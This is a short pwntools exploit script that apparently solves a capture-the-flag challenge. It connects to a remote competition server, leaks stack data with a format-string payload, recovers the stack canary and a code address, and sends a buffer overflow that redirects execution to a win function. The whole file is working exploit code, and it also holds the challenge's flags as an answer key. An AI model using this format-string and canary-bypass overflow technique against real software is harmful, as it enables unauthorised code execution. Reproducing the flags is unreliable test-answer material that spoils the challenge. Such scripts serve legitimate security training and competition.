from pwn import *

#p=process("./pwn2")
p=remote("hax1.allesctf.net",9101)
pwdch1Real=b"CSCG{NOW_PRACTICE_MORE}"
#pwdch1=b"CSCG{FLAG_FROM_STAGE_1}"
#pwdch=b"CSCG{THIS_IS_TEST_FLAG}"

p.recvuntil("Enter the password of stage 1:")
p.sendline(pwdch1Real)

FStr="|".join(["%p" for _ in range(42)])
p.recvuntil("Enter your witch name:")
p.sendline(FStr+"|")
leak=p.recvuntil("enter your magic spell:").split(b"|")
print(leak)
print(leak[-5])
canary=int(leak[-5],16)
print(leak[-3])
print(hex(int(leak[-3],16)-0x37))
main=int(leak[-3],16)-0x37
main_win_off=0x1fa
win_addr=main-main_win_off
ret_addr=win_addr+0x36
print(hex(win_addr))
#input('attach')
spell=b"Expelliarmus\x00"
#padding=b'X'*cyclic_find(b"cnaacoaa")
pad=b"x"*(0xff-13+9)
print(spell+pad+p64(canary))
pad2=b"x"*cyclic_find(b'caaadaaa')
p.sendline(spell+pad+p64(canary)+pad2+p64(ret_addr)+p64(win_addr))

p.interactive()
#CSCG{NOW_GET_VOLDEMORT}